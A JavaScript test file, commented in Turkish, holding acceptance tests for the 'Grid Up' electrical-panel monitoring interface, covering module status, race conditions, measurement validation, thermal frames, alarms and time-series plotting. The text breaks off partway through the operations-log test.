/**
 * Grid Up — İZ C: Monitoring Arayüzü Kabul ve Sözleşme Testleri
 * Koşturma: node --test arayuz/tests/test_arayuz_sozlesme.mjs
 * 
 * UI-01 - UI-08 Sözleşme ve Kabul Kriterleri Doğrulaması
 */


import test from 'node:test';
import assert from 'node:assert/strict';
import { setupMockEnvironment, loadApp, MockElement } from './harness.mjs';

test('UI-01: Saha/pano/modül ağacı, boş pano ve modül cihaz durumu doğrulaması', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // Fikstür: 1 saha, 2 pano. Pano 1'de aktif, sessiz, pasif modüller. Pano 2 boş.
    // GET /moduller iki sayfada (sayfalama) döner.
    let modullerCallCount = 0;
    global.fetch = async (url) => {
        if (url.includes('/moduller?limit=')) {
            modullerCallCount++;
            if (url.includes('ofset=0')) {
                return {
                    ok: true,
                    json: async () => ({
                        toplam: 3,
                        ofset: 0,
                        limit: 2,
                        veriler: [
                            { modul_id: 'M-AKTIF', durum: 'aktif', son_gorulme: '2026-09-19T10:00:00Z', seviye: 'normal' },
                            { modul_id: 'M-SESSIZ', durum: 'sessiz', son_gorulme: '2026-09-19T09:00:00Z', seviye: 'izle' }
                        ]
                    })
                };
            } else {
                return {
                    ok: true,
                    json: async () => ({
                        toplam: 3,
                        ofset: 2,
                        limit: 2,
                        veriler: [
                            { modul_id: 'M-PASIF', durum: 'pasif', son_gorulme: null, seviye: 'normal' }
                        ]
                    })
                };
            }
        }
        if (url.includes('/sahalar')) {
            return {
                ok: true,
                json: async () => ({
                    sahalar: [
                        {
                            saha_kodu: 'SAHA-1',
                            ad: 'Merkez Saha',
                            panolar: [
                                {
                                    pano_kodu: 'PANO-1',
                                    ad: 'Giriş Panosu',
                                    moduller: [
                                        { modul_id: 'M-AKTIF', aktif: true, seviye: 'normal' },
                                        { modul_id: 'M-SESSIZ', aktif: true, seviye: 'izle' },
                                        { modul_id: 'M-PASIF', aktif: false, seviye: 'normal' }
                                    ]
                                },
                                {
                                    pano_kodu: 'PANO-BOS',
                                    ad: 'Boş Yedek Pano',
                                    moduller: []
                                }
                            ]
                        }
                    ]
                })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.hiyerarsiyiYukle();

    // 1. Modüller için 2 sayfa sorgulanmış olmalıdır
    assert.equal(modullerCallCount, 2, "Modül durumu sorgusu sayfalama ile tamamlanmalı");

    // 2. Hiyerarşi container kontrolü
    const container = document.getElementById('hierarchy-container');
    const textContent = container.children.map(c => c.textContent || '').join(' ');

    // Boş pano gizlenmemeli, boş olduğu belirtilerek gösterilmelidir
    assert.match(textContent, /Boş Yedek Pano/, "Boş pano ağaçta yer almalıdır");
    assert.match(textContent, /Boş Pano/, "Boş pano ibaresi yer almalıdır");

    // 3. Durumlar kontrol edilmeli: pasif ve sessiz kayıtlar "Aktif" yazmamalı
    assert.equal(app.state.modulDurumlari['M-AKTIF'].durum, 'aktif');
    assert.equal(app.state.modulDurumlari['M-SESSIZ'].durum, 'sessiz');
    assert.equal(app.state.modulDurumlari['M-PASIF'].durum, 'pasif');

    // 4. Modülün cihaz durumu sonradan değişirse (aktif -> sessiz -> pasif -> aktif) ağaç ve üst panel güncellenmeli
    const subAktif = document.getElementById('modul-sub-text-M-AKTIF');
    assert.ok(subAktif, "Modül sub-text elementi ID ile erişilebilir olmalı");
    assert.equal(subAktif.textContent, 'Aktif');

    // M-AKTIF için durum sonradan 'sessiz'e değişirse:
    global.fetch = async (url) => {
        if (url.includes('/moduller?limit=')) {
            return {
                ok: true,
                json: async () => ({
                    toplam: 1,
                    ofset: 0,
                    limit: 50,
                    veriler: [
                        { modul_id: 'M-AKTIF', durum: 'sessiz', son_gorulme: '2026-09-19T09:30:00Z', seviye: 'normal' }
                    ]
                })
            };
        }
        return { ok: false, status: 404 };
    };

    app.state.aktifModulId = 'M-AKTIF';
    await app.modulDurumlariniGuncelle();

    assert.equal(subAktif.textContent, 'Sessiz', "Modül durumu sessiz olarak güncellenmeli");
    assert.match(subAktif.className, /sessiz/, "Sessiz sınıfı eklenmeli");
    const deviceBadge = document.getElementById('active-module-device-badge');
    assert.equal(deviceBadge.textContent, 'CİHAZ: SESSİZ', "Üst paneldeki rozet de SESSİZ olarak güncellenmeli");

    // Pasif'e değişirse:
    app.modulCihazDurumunuAğactaGuncelle('M-AKTIF', 'pasif', false);
    assert.equal(subAktif.textContent, 'Pasif', "Ağaçta Pasif yazmalı");
    assert.match(subAktif.className, /pasif/, "Pasif sınıfı eklenmeli");
    assert.equal(deviceBadge.textContent, 'CİHAZ: PASİF', "Üst panelde PASİF yazmalı");

    // Tekrar aktif olursa:
    app.modulCihazDurumunuAğactaGuncelle('M-AKTIF', 'aktif', true);
    assert.equal(subAktif.textContent, 'Aktif', "Ağaçta Aktif yazmalı");
    assert.equal(deviceBadge.textContent, 'CİHAZ: AKTİF', "Üst panelde AKTİF yazmalı");
});

test('UI-02: Modül seçimi yarış durumu (Race Condition), termal kare sıfırlama ve servis hatası izolasyonu', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 1. Önceki modülden kalan termal karenin yeni modül seçildiğinde derhal temizlenmesi doğrulaması
    app.state.termalMatris = new Float32Array(768).fill(48.5);
    app.state.termalOzet = { min: 22, max: 48.5, ort: 31 };
    app.state.termalKaynak = 'kanit';

    // Senaryo: A seçilir, A'nın yanıtı 60ms gecikir. Hemen B seçilir, B 10ms'de döner.
    // A'nın geciken yanıtı B'nin ekranına yazılmamalıdır!
    global.fetch = async (url) => {
        if (url.includes('/moduller/MODUL-A')) {
            await new Promise(r => setTimeout(r, 60));
            return {
                ok: true,
                json: async () => ({
                    modul_id: 'MODUL-A',
                    aktif: true,
                    son_gorulme: '2026-09-19T10:00:00Z',
                    son_olcumler: [
                        { olcum_tipi: 'ortam_sicaklik', deger: 99.9, birim: 'C', kalite: 'iyi' }
                    ]
                })
            };
        }
        if (url.includes('/moduller/MODUL-B')) {
            await new Promise(r => setTimeout(r, 10));
            return {
                ok: true,
                json: async () => ({
                    modul_id: 'MODUL-B',
                    aktif: true,
                    son_gorulme: '2026-09-19T11:00:00Z',
                    son_olcumler: [
                        { olcum_tipi: 'ortam_sicaklik', deger: 24.5, birim: 'C', kalite: 'iyi' }
                    ]
                })
            };
        }
        return { ok: false, status: 404 };
    };

    const pA = app.modulDetayYukle('MODUL-A');
    const pB = app.modulDetayYukle('MODUL-B');

    // B seçildiğinde hemen önceki modüle ait termal kare ve özet temizlenmiş olmalıdır
    assert.equal(app.state.termalMatris, null, "Yeni modül seçildiği an önceki termal kare matrisi sıfırlanmalıdır");
    assert.equal(app.state.termalOzet, null, "Yeni modül seçildiği an önceki termal özet sıfırlanmalıdır");
    assert.equal(app.state.termalKaynak, 'canli', "Termal kaynak canlıya dönmelidir");

    await Promise.all([pA, pB]);

    // B seçili olduğu için ekranda A'ya ait 99.9 kalmamalı, B'nin 24.5 değeri olmalıdır
    const tempEl = document.getElementById('val-temp');
    assert.equal(tempEl.textContent, '24.5', "A'nın geciken yanıtı B ekranını ezmemeli");
    const badgeEl = document.getElementById('active-module-badge');
    assert.equal(badgeEl.textContent, 'MODUL-B', "Başlık MODUL-B olmalı");

    // Servis hatası senaryosu: C'nin detay isteği 500 dönerse açık hata görünmeli, önceki metrik ve termal silinmeli
    app.state.termalMatris = new Float32Array(768).fill(30);
    global.fetch = async () => ({
        ok: false,
        status: 500,
        json: async () => ({ hata: { mesaj: "Sunucu arızası" } })
    });

    await app.modulDetayYukle('MODUL-C');
    const errBanner = document.getElementById('module-error-banner');
    assert.equal(errBanner.style.display, 'flex', "Hata bandı görünür olmalı");
    assert.equal(document.getElementById('val-temp').textContent, '--', "Hata anında önceki metrikler temizlenmeli");
    assert.equal(app.state.termalMatris, null, "Hata anında termal matris de temizlenmeli");
});

test('UI-03: Canlı ölçüm kalitesi, birim doğrulaması, eksik nötr/ark ve faz dengesizliği', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 1. Birim Doğrulama Fonksiyonu Birim Testleri
    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'C'), true, "C geçerli olmalı");
    assert.equal(app.birimGecerliMi('ortam_sicaklik', '°C'), true, "°C geçerli olmalı");
    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'F'), false, "Fahrenheit reddedilmeli");
    assert.equal(app.birimGecerliMi('ortam_sicaklik', 'Kelvin'), false, "Kelvin reddedilmeli");
    assert.equal(app.birimGecerliMi('nem', '%'), true, "% nem için geçerli olmalı");
    assert.equal(app.birimGecerliMi('nem', 'ppm'), false, "ppm nem için geçersiz olmalı");
    assert.equal(app.birimGecerliMi('akim_l1', 'A'), true, "A akım için geçerli olmalı");
    assert.equal(app.birimGecerliMi('akim_l1', 'V'), false, "Volt akım için reddedilmeli");
    assert.equal(app.birimGecerliMi('ark_olay', 'adet'), true, "adet ark için geçerli olmalı");

    // 2. Birim Uyumsuzluğu Senaryosu: Sıcaklık birimi 'F' geldiğinde değer reddedilmeli ve Birim Uyumsuz yazmalı
    global.fetch = async () => ({
        ok: true,
        json: async () => ({
            modul_id: 'M-BIRIM-TEST',
            aktif: true,
            besleme: 'sebeke',
            sinyal: -65,
            son_gorulme: '2026-09-19T12:00:00Z',
            son_olcumler: [
                { olcum_tipi: 'ortam_sicaklik', deger: 77.0, birim: 'F', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }
            ]
        })
    });

    await app.modulDetayYukle('M-BIRIM-TEST');
    const tempBirimVal = document.getElementById('val-temp');
    assert.equal(tempBirimVal.textContent, '--', "Uyumsuz birimde değer gösterilmemeli (-- olmalı)");
    const tempStatus = document.getElementById('temp-status');
    assert.match(tempStatus.textContent, /Birim uyumsuz/, "Kart durumu 'Birim uyumsuz' uyarısı göstermeli");

    // 3. Kalite, Bağımsız Zaman Damgası, null besleme ve 3-Faz Akım Doğrulaması
    global.fetch = async () => ({
        ok: true,
        json: async () => ({
            modul_id: 'M-KALITE-TEST',
            aktif: true,
            besleme: null,       // null besleme sebeke yapılmamalı!
            sinyal: null,        // null sinyal
            son_gorulme: '2026-09-19T12:00:00Z',
            son_olcumler: [
                { olcum_tipi: 'ortam_sicaklik', deger: 0.0, birim: 'C', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }, // Gerçek 0
                { olcum_tipi: 'nem', deger: 45.0, birim: '%', kalite: 'supheli', zaman: '2026-09-19T12:02:30Z' },      // Farklı zaman & şüpheli kalite
                { olcum_tipi: 'akim_l1', deger: 10.0, birim: 'A', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' },
                { olcum_tipi: 'akim_l2', deger: 10.5, birim: 'A', kalite: 'supheli', zaman: '2026-09-19T12:00:00Z' },  // L2 şüpheli!
                { olcum_tipi: 'akim_l3', deger: 10.2, birim: 'A', kalite: 'iyi', zaman: '2026-09-19T12:00:00Z' }
                // akim_notr ve ark_olay EKSİK (dizide yok)
            ]
        })
    });

    await app.modulDetayYukle('M-KALITE-TEST');

    // a. besleme=null "BİLİNMİYOR" olmalı, "ŞEBEKE" olmamalı
    const feedEl = document.getElementById('val-feed');
    assert.equal(feedEl.textContent, 'BİLİNMİYOR');

    // b. Gerçek 0 değeri gösterilmeli
    const tempEl = document.getElementById('val-temp');
    assert.equal(tempEl.textContent, '0.0');

    // c. Eksik nötr akımı ve ark sayacı kesinlikle '0' olmamalı, '--' olmalı
    const notrEl = document.getElementById('val-notr');
    const arcEl = document.getElementById('val-arc');
    assert.equal(notrEl.textContent, '--', 'Eksik nötr akımı -- olmalı');
    assert.equal(arcEl.textContent, '--', 'Eksik ark sayacı -- olmalı');

    // d. L2 şüpheli olduğundan faz dengesizliği hesaplanamamalı
    const diffEl = document.getElementById('current-diff');
    assert.equal(diffEl.textContent, 'Faz Dengesizliği: Hesaplanamadı', 'Şüpheli faz varken denge güvenilir hesaplanmamalı');

    // e. Şüpheli ölçüm uyarısı eklenmeli
    const humCard = document.getElementById('card-hum');
    assert.ok(humCard.querySelector('.card-quality-warning'), 'Şüpheli ölçüm kartında uyarı görünmeli');
});

test('UI-04: Gerçek 768 tam kare doğrulama, geciken kanıt karesi yarış durumu (Race Condition) izolasyonu', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 1. Geçersiz kare testleri
    const gecersizBoyut = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'M1',
        piksel_verisi: new Array(767).fill(30) // 767 piksel (eksik)
    };
    assert.equal(app.tamKareyiDogrula(gecersizBoyut, 'M1', null), false, '767 piksel reddedilmeli');

    const nanIceren = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'M1',
        piksel_verisi: new Array(768).fill(30)
    };
    nanIceren.piksel_verisi[40] = NaN;
    assert.equal(app.tamKareyiDogrula(nanIceren, 'M1', null), false, 'NaN içeren kare reddedilmeli');

    const yanlisModul = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'YANLIS-MODUL',
        piksel_verisi: new Array(768).fill(30)
    };
    assert.equal(app.tamKareyiDogrula(yanlisModul, 'M1', null), false, 'Yanlış modül reddedilmeli');

    // 2. Doğru kare ve piksel indeksi y * 32 + x formülü (x=14, y=9)
    const gecerliKare = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'M1',
        zaman: '2026-09-19T12:00:00Z',
        piksel_verisi: new Array(768).fill(25.0)
    };
    const hedefIndeks = 9 * 32 + 14;
    gecerliKare.piksel_verisi[hedefIndeks] = 62.3;
    assert.equal(app.tamKareyiDogrula(gecerliKare, 'M1', '2026-09-19T12:00:00Z'), true, 'Geçerli kare kabul edilmeli');
    assert.equal(gecerliKare.piksel_verisi[hedefIndeks], 62.3, 'Piksel y*32+x indeksinden okunmalı');

    // 3. Kanıt Karesinde skor=0.85 iken sıcaklık etiketi 85 °C DEĞİL, gerçek piksel 62.3 °C olmalı
    app.state.cozulmemisAnomaliler = [
        {
            id: 'ANOM-1',
            modul_id: 'M1',
            tip: 'termal_sicak_nokta',
            seviye: 'uyari',
            skor: 0.85,
            kanit: { kare_id: 'KARE-1', piksel: [14, 9] }
        },
        {
            id: 'ANOM-2',
            modul_id: 'M1',
            tip: 'termal_sicak_nokta',
            seviye: 'kritik',
            skor: 0.95,
            kanit: { kare_id: 'KARE-2', piksel: [5, 5] }
        }
    ];

    global.fetch = async (url) => {
        if (url.includes('/termal/kare/KARE-1')) {
            return { ok: true, json: async () => gecerliKare };
        }
        return { ok: false, status: 404 };
    };

    await app.anomaliSec('ANOM-1');
    const valTmax = document.getElementById('val-tmax');
    assert.equal(valTmax.textContent, '62.3', 'Sıcaklık skordan üretilmemeli, gerçek piksel sıcaklığı olmalı');

    // 4. Yarış Durumu (Race Condition) Testi:
    // Kullanıcı ANOM-1'i seçer (KARE-1 yanıtı 80ms gecikir).
    // Kullanıcı hemen ANOM-2'yi seçer (KARE-2 yanıtı 10ms'de döner).
    // Geciken KARE-1 yanıtı geldiğinde ANOM-2 ekranını EZMEMELİDİR!
    const kare1 = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'M1',
        zaman: '2026-09-19T12:00:00Z',
        piksel_verisi: new Array(768).fill(40.0)
    };
    kare1.piksel_verisi[9 * 32 + 14] = 45.0;

    const kare2 = {
        satir_sayisi: 24,
        sutun_sayisi: 32,
        modul_id: 'M1',
        zaman: '2026-09-19T12:01:00Z',
        piksel_verisi: new Array(768).fill(70.0)
    };
    kare2.piksel_verisi[5 * 32 + 5] = 88.0;

    global.fetch = async (url) => {
        if (url.includes('/termal/kare/KARE-1')) {
            await new Promise(r => setTimeout(r, 80));
            return { ok: true, json: async () => kare1 };
        }
        if (url.includes('/termal/kare/KARE-2')) {
            await new Promise(r => setTimeout(r, 10));
            return { ok: true, json: async () => kare2 };
        }
        return { ok: false, status: 404 };
    };

    const pAnom1 = app.anomaliSec('ANOM-1');
    const pAnom2 = app.anomaliSec('ANOM-2');
    await Promise.all([pAnom1, pAnom2]);

    assert.equal(app.state.seciliAnomaliId, 'ANOM-2', "Seçili anomali ANOM-2 kalmalı");
    assert.equal(app.state.termalMatris[5 * 32 + 5], 88.0, "ANOM-2'nin piksel verisi aktif kalmalı");
    assert.notEqual(app.state.termalMatris[9 * 32 + 14], 45.0, "Geciken ANOM-1 karesi ANOM-2 ekranını ezmemeli");

    // 5. Canlı Görüntüye Dönüş Yarış Durumu Testi:
    // Kullanıcı ANOM-1'i seçer (80ms gecikir), fakat hemen canliGoruntuyeDon() butonuna tıklar.
    // Geciken kanıt karesi canlı termal modunu kanıt karesine çevirmemelidir!
    const pAnomLate = app.anomaliSec('ANOM-1');
    app.canliGoruntuyeDon();
    await pAnomLate;

    assert.equal(app.state.termalKaynak, 'canli', "Canlı moda dönüldükten sonra geciken kanıt karesi canlı modu ezmemelidir");
    assert.equal(app.state.seciliAnomaliId, null, "Seçili anomali null kalmalıdır");
});

test('UI-05: 51 açık + 2 onaylı olayda 53 çözülmemiş olay taranması, hata izolasyonu ve onay akışı', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 51 açık olay (2 sayfada: 50 + 1) ve 2 onaylı olay (1 sayfada: 2)
    const acikOlaylar = Array.from({ length: 51 }, (_, i) => ({
        id: `A-${i + 1}`,
        sira: i + 1,
        modul_id: 'M1',
        seviye: 'uyari',
        durum: 'acik',
        gerekce: `Gerekçe ${i + 1}`
    }));

    const onayliOlaylar = [
        { id: 'O-1', sira: 52, modul_id: 'M1', seviye: 'izle', durum: 'onaylandi', gerekce: 'Onaylandı 1' },
        { id: 'O-2', sira: 53, modul_id: 'M1', seviye: 'izle', durum: 'onaylandi', gerekce: 'Onaylandı 2' }
    ];

    global.fetch = async (url) => {
        if (url.includes('/anomaliler?durum=acik')) {
            if (!url.includes('sonra=')) {
                return {
                    ok: true,
                    json: async () => ({
                        veriler: acikOlaylar.slice(0, 50),
                        sonraki: 50,
                        limit: 50
                    })
                };
            } else {
                return {
                    ok: true,
                    json: async () => ({
                        veriler: acikOlaylar.slice(50),
                        sonraki: null,
                        limit: 50
                    })
                };
            }
        }
        if (url.includes('/anomaliler?durum=onaylandi')) {
            return {
                ok: true,
                json: async () => ({
                    veriler: onayliOlaylar,
                    sonraki: null,
                    limit: 50
                })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.alarmlariYukle();

    // Toplam çözülmemiş olay 53 olmalıdır
    const counterEl = document.getElementById('active-alarm-count');
    assert.equal(counterEl.textContent, '53', '51 açık + 2 onaylı olay tam taranıp 53 olarak sayılmalı');
    assert.equal(app.state.cozulmemisAnomaliler.length, 53);

    // Boş operatör adı ile onay engellenmeli
    let alertCalled = false;
    global.alert = () => { alertCalled = true; };
    document.getElementById('operator-id-input').value = '   ';
    await app.alarmOnayla('A-1', 'M1');
    assert.equal(alertCalled, true, 'Boş operatör adıyla onay engellenmeli');

    // Başarılı onaydan sonra kart kalmalı ve onaylandi durumuna geçmeli
    document.getElementById('operator-id-input').value = 'op_test';
    global.fetch = async (url, opts) => {
        if (opts && opts.method === 'POST') {
            return {
                ok: true,
                json: async () => ({ id: 'A-1', durum: 'onaylandi', modul_id: 'M1' })
            };
        }
        return {
            ok: true,
            json: async () => ({ veriler: [], sonraki: null, limit: 50 })
        };
    };
    await app.alarmOnayla('A-1', 'M1');
    const cardA1 = document.getElementById('alarm-card-A-1');
    assert.ok(cardA1, 'Başarılı onaydan sonra kart silinmemeli');
    const btn = cardA1.querySelector('.btn-ack');
    assert.match(btn.textContent, /Onaylandı/, 'Kart Onaylandı durumuna geçmeli');

    // 409 durumunda API kapandi diyorsa kart silinmeli
    global.fetch = async (url, opts) => {
        if (opts && opts.method === 'POST') {
            return { ok: false, status: 409, json: async () => ({}) };
        }
        if (url.includes('/anomaliler/A-1')) {
            return { ok: true, json: async () => ({ id: 'A-1', durum: 'kapandi' }) };
        }
        return { ok: true, json: async () => ({ veriler: [], sonraki: null }) };
    };
    await app.alarmOnayla('A-1', 'M1');
    assert.equal(document.getElementById('alarm-card-A-1'), null, '409 sonrası kapandi dönen olay kartı silinmeli');

    // 500 hatasında kart silinmemeli
    const testCard = new MockElement('div', 'alarm-card-A-2');
    document.getElementById('alarms-container').appendChild(testCard);
    let postCount = 0;
    global.fetch = async (url, opts) => {
        if (opts && opts.method === 'POST') {
            postCount++;
            return { ok: false, status: 500, json: async () => ({ hata: { mesaj: "Sunucu hatası" } }) };
        }
        return { ok: true, json: async () => ({ veriler: [], sonraki: null }) };
    };
    await app.alarmOnayla('A-2', 'M1');
    // Servis Hatası (HTTP 500 / Ağ Hatası) Doğrulaması:
    // Alarm servisi çöktüğünde "Sistem Stabil" DEĞİL, hata paneli görünmeli ve sayaç '--' olmalıdır!
    global.fetch = async (url) => {
        if (url.includes('/anomaliler')) {
            return {
                ok: false,
                status: 500,
                json: async () => ({ hata: { mesaj: "Veritabanı bağlantı hatası" } })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.alarmlariYukle();
    const alarmsContainer = document.getElementById('alarms-container');
    assert.doesNotMatch(alarmsContainer.innerHTML, /Sistem Stabil/, "Alarm servisi 500 dönerken 'Sistem Stabil' gösterilmemeli");
    assert.match(alarmsContainer.innerHTML, /Alarm Servisi Hatası|bağlantı kurulamadı/, "Alarm servisi hata paneli gösterilmeli");
    assert.equal(document.getElementById('active-alarm-count').textContent, '--', "Alarm servisi hata verdiğinde sayaç '--' olmalı");

    // Ağ Hatası (fetch throwing exception) testi
    global.fetch = async () => { throw new Error("Ağ bağlantısı koptu (NetworkError)"); };
    await app.alarmlariYukle();
    assert.doesNotMatch(alarmsContainer.innerHTML, /Sistem Stabil/, "Ağ hatasında da 'Sistem Stabil' gösterilmemeli");
    assert.equal(document.getElementById('active-alarm-count').textContent, '--', "Ağ hatasında sayaç '--' olmalı");
});

test('UI-06: Zaman serisi gerçek zaman aralıklı çizim, boşluk (gap) yönetimi ve izolasyon', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 1. Ham seri fikstürü
    app.state.aktifModulId = 'M-SERI';
    document.getElementById('timeseries-metric').value = 'ortam_sicaklik';
    document.getElementById('timeseries-interval').value = ''; // Ham
    document.getElementById('timeseries-range').value = ''; // Tüm Geçmiş

    global.fetch = async (url) => {
        if (url.includes('/seri') && !url.includes('aralik=')) {
            return {
                ok: true,
                json: async () => ({
                    modul_id: 'M-SERI',
                    olcum_tipi: 'ortam_sicaklik',
                    aralik: null,
                    noktalar: [
                        { zaman: '2026-09-19T10:00:00Z', deger: 22.0, birim: 'C', kalite: 'iyi' },
                        { zaman: '2026-09-19T10:01:00Z', deger: 23.5, birim: 'C', kalite: 'supheli' },
                        { zaman: '2026-09-19T10:02:00Z', deger: 24.0, birim: 'C', kalite: 'iyi' }
                    ]
                })
            };
        }
        return { ok: false, status: 404 };
    };

    await app.zamanSerisiYukle();
    assert.equal(app.state.seriNoktalar.length, 3, '3 ham nokta yüklenmeli');

    // 2. Boş seri testi: sıfır çizgisi DEĞİL, "Bu aralıkta ölçüm yok" mesajı görünmeli
    global.fetch = async () => ({
        ok: true,
        json: async () => ({ modul_id: 'M-SERI', olcum_tipi: 'ortam_sicaklik', noktalar: [] })
    });
    await app.zamanSerisiYukle();
    const msgEl = document.getElementById('timeseries-message');
    assert.equal(msgEl.textContent, 'Bu aralıkta ölçüm yok', 'Boş seride doğru mesaj gösterilmeli');

    // 3. Geçmiş zaman aralığı (bas parametresi) testi
    let sonCagirilanUrl = '';
    document.getElementById('timeseries-range').value = '24h';
    global.fetch = async (url) => {
        sonCagirilanUrl = url;
        return {
            ok: true,
            json: async () => ({ modul_id: 'M-SERI', olcum_tipi: 'ortam_sicaklik', noktalar: [] })
        };
    };
    await app.zamanSerisiYukle();
    assert.ok(sonCagirilanUrl.includes('bas='), 'Son 24 saat geçmişi seçildiğinde bas parametresi gönderilmeli');

    // 4. cok_fazla_nokta hatasında otomatik kova seçimi
    document.getElementById('timeseries-interval').value = '';
    let denemeSayisi = 0;
    global.fetch = async (url) => {
        denemeSayisi++;
        if (!url.includes('aralik=')) {
            return {
                ok: false,
                status: 400,
                json: async () => ({
                    hata: { kod: 'cok_fazla_nokta', mesaj: '5000 noktayı aşıyor' }
                })
            };
        }
        return {
            ok: true,
            json: async () => ({
                modul_id: 'M-SERI',
                olcum_tipi: 'ortam_sicaklik',
                aralik: '10s',
                noktalar: [{ zaman: '2026-09-19T10:00:00Z', ort: 25.0, asgari: 24.0, azami: 26.0, supheli: 0 }]
            })
        };
    };
    await app.zamanSerisiYukle();
    assert.ok(document.getElementById('timeseries-interval').value !== '', 'cok_fazla_nokta sonrası kova boyutu otomatik yükseltilmeli');

    // 5. 3-Faz Akımları (L1, L2, L3) çoklu karşılaştırma testi
    document.getElementById('timeseries-metric').value = 'akim_hepsi';
    const cagirilanTipler = [];
    global.fetch = async (url) => {
        if (url.includes('tip=akim_l1')) cagirilanTipler.push('akim_l1');
        if (url.includes('tip=akim_l2')) cagirilanTipler.push('akim_l2');
        if (url.includes('tip=akim_l3')) cagirilanTipler.push('akim_l3');
        return {
            ok: true,
            json: async () => ({
                modul_id: 'M-SERI',
                olcum_tipi: 'akim',
                noktalar: [{ zaman: '2026-09-19T10:00:00Z', deger: 75.0, birim: 'A', kalite: 'iyi' }]
            })
        };
    };
    await app.zamanSerisiYukle();
    assert.ok(cagirilanTipler.includes('akim_l1') && cagirilanTipler.includes('akim_l2') && cagirilanTipler.includes('akim_l3'), '3-Faz akımları için L1, L2 ve L3 birlikte çekilmeli');
    assert.ok(app.state.seriCokluVeri && app.state.seriCokluVeri.l1 && app.state.seriCokluVeri.l2 && app.state.seriCokluVeri.l3, 'seriCokluVeri nesnesi L1, L2, L3 verileriyle doldurulmalı');

    // 6. Gerçek Zaman Aralıklarına Göre Orantılı Çizim Doğrulaması:
    // 3 nokta: t0=0s, t1=60s (+1dk), t2=600s (+10dk toplam süre).
    // İndeks bazlı çizilseydi t1 ekranın %50'sinde olurdu.
    // Gerçek zaman aralıklı çizimde t1, 60/600 = %10 konumunda olmalıdır!
    const canvas = document.getElementById('timeseriesCanvas');
    canvas.canvasCalls = [];

    const zamanOranNoktalari = [
        { zaman: '2026-09-19T10:00:00.000Z', deger: 20.0, kalite: 'iyi' },
        { zaman: '2026-09-19T10:01:00.000Z', deger: 25.0, kalite: 'iyi' },
        { zaman: '2026-09-19T10:10:00.000Z', deger: 30.0, kalite: 'iyi' }
    ];

    app.state.seriNoktalar = zamanOranNoktalari;
    app.state.seriBasZamanMs = null;
    app.state.seriBitZamanMs = null;
    app.zamanSerisiCizGenel(zamanOranNoktalari, 'ortam_sicaklik', null, null);

    assert.ok(app.state.aktifSeriCizimVerisi, "Çizim verisi oluşturulmuş olmalı");
    const pts = app.state.aktifSeriCizimVerisi.points;
    assert.equal(pts.length, 3, "3 nokta çizilmiş olmalı");
    const x0 = pts[0].screenX;
    const x1 = pts[1].screenX;
    const x2 = pts[2].screenX;
    const oran = (x1 - x0) / (x2 - x0);
    assert.ok(Math.abs(oran - 0.10) < 0.05, `t1 noktası zamana orantılı olarak ~%10 konumunda olmalı (ölçülen: ${oran.toFixed(3)})`);

    // 7. Kesintili Veride Boşluk (Gap) Yönetimi Doğrulaması:
    // Arasında 40 dakika (2400 saniye) boşluk olan ölçümler sahte düz çizgiyle birleştirilmemeli, moveTo ile kırılmalıdır.
    canvas.canvasCalls = [];
    const kesintiliNoktalar = [
        { zaman: '2026-09-19T10:00:00.000Z', deger: 20.0, kalite: 'iyi' },
        { zaman: '2026-09-19T10:00:10.000Z', deger: 20.5, kalite: 'iyi' },
        { zaman: '2026-09-19T10:00:20.000Z', deger: 20.8, kalite: 'iyi' },
        // 40 dakika kesinti!
        { zaman: '2026-09-19T10:40:20.000Z', deger: 28.0, kalite: 'iyi' },
        { zaman: '2026-09-19T10:40:30.000Z', deger: 28.2, kalite: 'iyi' }
    ];

    app.zamanSerisiCizGenel(kesintiliNoktalar, 'ortam_sicaklik', null, null);

    const gapPts = app.state.aktifSeriCizimVerisi.points;
    const p3 = gapPts[3];
    const p3Move = canvas.canvasCalls.find(c => c.type === 'moveTo' && Math.abs(c.x - p3.screenX) < 1 && Math.abs(c.y - p3.screenY) < 1);
    assert.ok(p3Move, "Zaman boşluğu sonrası nokta için moveTo çağrılarak çizgi kesilmelidir");
});

test('UI-07: Operasyon günlüğü artan sıradan en büyük son 30 geçişin alınması ve tek yenilemede >50 yeni geçiş', async () => {
    setupMockEnvironment();
    const app = await loadApp();

    // 60 geçiş üret (id: 1..60). API keyset pagination: ilk sayfa 1..50 (sonraki=50), ikinci sayfa 51..60 (sonraki=null).
    const tumGecisler = Array.from({ length: 60 }, (_, i) => ({
        id: i + 1,
        anomali_id: `ANOM-${i + 1}`,
        zaman: '2026-09-19T10:00:00Z',
        alan: 'durum',
        onceki: 'acik',
        yeni: (i % 2 === 0 ? 'onaylandi' : 'kapandi'),
        aktor: 'operator_test'
    }));

    app.state.sonGecisId = null;
    app.state.gecisler = [];

    global.fetch = async (url) => {
        if (url.includes('/gecisler')) {
            if (!url.includes('sonra=')) {
                return {
                    ok: true,
                    json: async () => ({
                        veriler: tumGecisler.slice(0, 50),
                        sonraki: 50,
                        limit: 50
                    })
                };
            } else if (url.includes('sonra=50')) {
                return {
                    ok: true,
                    json: async () => ({
                        veriler: tumGecisler.slice(50),
                        sonraki: null,
                        limit: 50
                    })
                };
            } else if (url.includes('sonra=60')) {
                // 61 numaralı yeni geçiş
                return {
                    ok: true,
                    json: async () => ({
                        veriler: [
                            { id: 61, anomali_id: 'ANOM-61', zaman: '2026-09-19T10:05:00Z', alan: 'durum', yeni: 'onaylandi', aktor: 'op_61' }
                        ],
                        sonraki: null,
                        limit: 50
                    })
                };
            }
        }
        return { ok: false, status: 404 };
    };

